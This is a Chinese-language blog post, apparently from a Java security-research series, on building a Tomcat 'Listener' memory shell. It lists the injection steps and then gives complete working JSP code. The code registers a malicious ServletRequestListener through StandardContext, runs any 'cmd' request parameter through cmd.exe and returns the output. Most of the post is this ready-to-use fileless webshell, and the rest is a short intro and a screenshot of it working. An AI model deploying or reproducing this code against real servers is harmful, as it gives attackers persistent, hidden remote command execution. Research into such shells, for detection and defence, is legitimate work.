+++
title = "Listener内存马"
date = 2026-06-15T19:47:23+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

# 前置条件

如果我们想要写一个`Listener`内存马，需要经过以下步骤：  
  
- 继承并编写一个恶意`Listener`  
- 获取`StandardContext`  
- 调用`StandardContext.addApplicationEventListener()`添加恶意`Listener`


# 完整代码


```jsp
<%@ page import="org.apache.catalina.core.StandardContext" %>

<%@ page import="java.lang.reflect.Field" %>

<%@ page import="org.apache.catalina.connector.Request" %>

<%@ page import="java.io.InputStream" %>

<%@ page import="java.util.Scanner" %>

  

<%!

    public class EvilListener implements ServletRequestListener {

        public void requestDestroyed(ServletRequestEvent sre) {

            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();

            if (req.getParameter("cmd") != null){

                InputStream in = null;

                try {

                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();

                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");

                    String out = s.hasNext()?s.next():"";

                    Field requestF = req.getClass().getDeclaredField("request");

                    requestF.setAccessible(true);

                    Request request = (Request)requestF.get(req);

                    request.getResponse().setCharacterEncoding("GBK");

                    request.getResponse().getWriter().write(out);

                }

                catch (Exception ignored) {}

            }

        }

        public void requestInitialized(ServletRequestEvent sre) {}

    }

%>

  

<%

    Field reqF = request.getClass().getDeclaredField("request");

    reqF.setAccessible(true);

    Request req = (Request) reqF.get(request);

    StandardContext context = (StandardContext) req.getContext();

    EvilListener evilListener = new EvilListener();

    context.addApplicationEventListener(evilListener);

    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;Inject Listener Memory Shell successfully!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Shell url: http://localhost:8080/servlet/?cmd=ipconfig");

%>
```


# 运行示例

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518110215227.png)


